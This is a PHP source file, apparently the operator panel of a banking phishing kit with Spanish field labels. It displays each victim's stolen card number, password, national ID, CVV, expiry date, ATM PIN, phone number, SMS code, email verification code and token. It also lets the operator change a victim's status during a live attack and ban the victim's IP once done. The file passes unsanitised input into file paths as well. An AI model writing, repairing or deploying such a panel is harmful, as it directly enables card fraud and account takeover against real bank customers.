<?php
session_start();
if(!$_POST)
{
    echo "error qs09po12";
    exit;
}

if(!isset($_POST["file"]))
{
    echo "error derefuy7";
    exit;
}
if(!isset($_POST["Op"]))
{
    echo "error sdwefs87asd";
    exit;
}
$op = trim($_POST["Op"]);
if($op == "")
{
    echo "error as9876534lkoas";
    exit;
}
$file = trim($_POST["file"]);
if(!file_exists("data/$file"))
{
    echo "error 343e35434 archivo no existe";
    exit;
}



$datos_json = @file_get_contents("data/$file");
if($datos_json == FALSE)
{
    echo "error 98123oiqwe";
    exit;
}
$datos_array = json_decode($datos_json, TRUE);

require "../config.php";

if($op=="PaintData")
{
?>
<table  >
    <tr>
        <th>ip / estado</th>
        <td><?php echo $datos_array["ip"]." / ".$datos_array["estado"]; ?></td>
    </tr>
    <tr>
        <th>tarjeta</th>
        <td><?php echo $datos_array["card"]; ?></td>
    </tr>
    <tr>
        <th>pass</th>
        <td><?php echo $datos_array["pass"]; ?></td>
    </tr>
    <tr>
        <th>dni</th>
        <td><?php echo $datos_array["dni"]; ?></td>
    </tr>
    <tr>
        <th>nombre</th>
        <td><?php echo $datos_array["nombre"]; ?></td>
    </tr>
    <tr>
        <th>cc</th>
        <td><?php echo "FV: {$datos_array["date"]}<br>CVV: {$datos_array["cvv"]}<br>ATM: {$datos_array["atm"]}" ; ?></td>
    </tr>
    <tr>
        <th>Operador / celular</th>
        <td><?php echo "{$datos_array["operador"]}<br>{$datos_array["numero"]}" ; ?></td>
    </tr>
    <tr>
        <th>Cod SMS</th>
        <td><?php echo $datos_array["sms"]; ?></td>
    </tr>
    <tr>
        <th>Correo</th>
        <td><?php echo $datos_array["correo"]; ?></td>
    </tr>
    <tr>
        <th>Codigo correo</th>
        <td><?php echo $datos_array["codigo_correo"]; ?></td>
    </tr>
    <tr>
        <th>Token</th>
        <td><?php echo $datos_array["token"]; ?></td>
    </tr>
    
</table>
<?php
}

if($op=="cambiar_estado")
{
    $estado = $_POST["estado"];
    $datos_array["estado"] = $estado;
    $datos_json = json_encode($datos_array, JSON_HEX_APOS);
    $fo = fopen("data/$file","w");
    fwrite($fo,$datos_json);
    fclose($fo);
    
    if($estado=="fin")
    {
        $ban = fopen("../IPBam.txt","a+");
	fwrite($ban,$datos_array["ip"]."\r\n");
	fclose($ban);
    }
    echo "Correcto";
    exit;
}

if($op=="cambiar_correo")
{
    $correo = $_POST["correo"];
    $datos_array["correo"] = $correo;
    $datos_json = json_encode($datos_array, JSON_HEX_APOS);
    $fo = fopen("data/$file","w");
    fwrite($fo,$datos_json);
    fclose($fo);

    echo "Correcto";
    exit;
}

if($op=="cambiar_nombre")
{
    $nombre = $_POST["nombre"];
    $datos_array["nombre"] = $nombre;
    $datos_json = json_encode($datos_array, JSON_HEX_APOS);
    $fo = fopen("data/$file","w");
    fwrite($fo,$datos_json);
    fclose($fo);

    echo "Correcto";
    exit;
}

?>

